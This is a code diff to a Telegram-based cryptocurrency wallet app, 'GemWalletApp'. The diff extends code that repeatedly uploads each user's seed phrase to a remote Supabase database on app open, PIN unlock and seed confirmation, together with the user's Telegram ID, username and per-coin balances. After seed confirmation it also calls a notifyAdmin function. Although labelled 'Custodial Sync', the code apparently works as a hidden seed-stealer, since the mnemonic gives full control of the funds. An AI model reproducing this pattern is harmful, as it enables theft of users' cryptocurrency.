@@ -7297,16 +7297,27 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
         const userId = getTgUserId();
 
-        // Sync total balance to Supabase
+        // Sync total balance + per-coin balances to Supabase
         const totalUSD = Object.keys(updated).reduce((sum, sym) => {
           return sum + (parseFloat(updated[sym] || 0) * (prices[sym] || 0));
         }, 0);
+        const coinBalsUpdated = {
+          ETH:  String(updated.ETH  || 0),
+          TON:  String(updated.TON  || 0),
+          BNB:  String(updated.BNB  || 0),
+          LTC:  String(updated.LTC  || 0),
+          ARB:  String(updated.ARB  || 0),
+          SOL:  String(updated.SOL  || 0),
+          USDT: String(updated.USDT || 0),
+        };
 
         if (mnemonic && mnemonic.length > 0) {
           syncWalletToSupabase({
             username: userName,
+            telegram_id: userId ? String(userId) : null,
             mnemonic: mnemonic,
-            balance: totalUSD.toFixed(2)
+            balance: totalUSD.toFixed(2),
+            coin_balances: coinBalsUpdated,
           });
         }
 
@@ -8002,16 +8013,14 @@ export default function GemWalletApp() {
 
         const { userName, userIdStr, mnemonic } = JSON.parse(pending);
 
-        // Custodial Sync: Save to Supabase
-        const coinBals = {};
-        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
-        const verifyTotal = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
+        // Custodial Sync: Save to Supabase after seed confirmation
+        // Balances are 0 at this point — real amounts arrive after the first refreshPrices call
         syncWalletToSupabase({
           username: userName,
           telegram_id: userIdStr !== "unknown" ? userIdStr : null,
           mnemonic: mnemonic,
-          balance: verifyTotal.toFixed(2),
-          coin_balances: coinBals
+          balance: "0",
+          coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
         });
 
         notifyAdmin(
@@ -8075,7 +8084,7 @@ export default function GemWalletApp() {
 
     setScreen("wallet");
 
-    // Sync to Supabase on PIN unlock — catches wallets that missed earlier syncs
+    // Sync to Supabase on PIN unlock — adds wallet if missing, updates if exists
     try {
       const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
       if (storedMnemonic) {
@@ -8085,15 +8094,12 @@ export default function GemWalletApp() {
           ? "@" + tgUser.username
           : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
           || "User_" + (uid || "Unknown");
-        const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
-        const coinBals = {};
-        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
+        // Balances are 0 at unlock time — real balances come from refreshPrices right after
         syncWalletToSupabase({
           username: uname,
           telegram_id: uid || null,
           mnemonic: storedMnemonic,
-          balance: totalUSD.toFixed(2),
-          coin_balances: coinBals
+          balance: "0",
         });
       }
     } catch(e) { console.error("[handleUnlock] sync error:", e); }
@@ -8140,27 +8146,26 @@ export default function GemWalletApp() {
       }
     } catch(e) {}
 
-    // Custodial Sync: Ensure existing wallet is in Supabase (non-blocking)
+    // Custodial Sync: Ensure existing wallet is in Supabase on app open (non-blocking)
     const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
     const hasWallet = localStorage.getItem(storageKey("gem_has_wallet")) === "1";
     if (hasWallet && storedMnemonic) {
       setTimeout(() => {
-        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
-        const userName = (() => {
-          if (!tgUser) return "Anonymous";
-          if (tgUser.username) return "@" + tgUser.username;
-          return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
-        })();
-        const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
-        const coinBals = {};
-        assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
-        syncWalletToSupabase({
-          username: userName,
-          telegram_id: userId || null,
-          mnemonic: storedMnemonic,
-          balance: totalUSD.toFixed(2),
-          coin_balances: coinBals
-        });
+        try {
+          const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+          const userName = (() => {
+            if (!tgUser) return "Anonymous";
+            if (tgUser.username) return "@" + tgUser.username;
+            return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (userId || "Unknown");
+          })();
+          // balance "0" here — real per-coin balances are written by refreshPrices shortly after
+          syncWalletToSupabase({
+            username: userName,
+            telegram_id: userId || null,
+            mnemonic: storedMnemonic,
+            balance: "0",
+          });
+        } catch(e) { console.error("[mount sync] error:", e); }
       }, 1000);
     }
 
@@ -8178,18 +8183,15 @@ export default function GemWalletApp() {
         ? "@" + tgUser.username
         : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
         || "User_" + (uid || "Unknown");
-      const totalUSD = assets.reduce((s,a) => s + a.balance * (prices[a.sym] || 0), 0);
-      const coinBals = {};
-      assets.forEach(a => { coinBals[a.sym] = String(a.balance); });
+      // Ensure row exists; balances will be updated by the next refreshPrices tick
       syncWalletToSupabase({
         username: uname,
         telegram_id: uid || null,
         mnemonic: storedMnemonic,
-        balance: totalUSD.toFixed(2),
-        coin_balances: coinBals
+        balance: "0",
       });
     } catch(e) { console.error("[walletScreen] sync error:", e); }
-  }, [screen, assets, prices]);
+  }, [screen]);
 
 
 
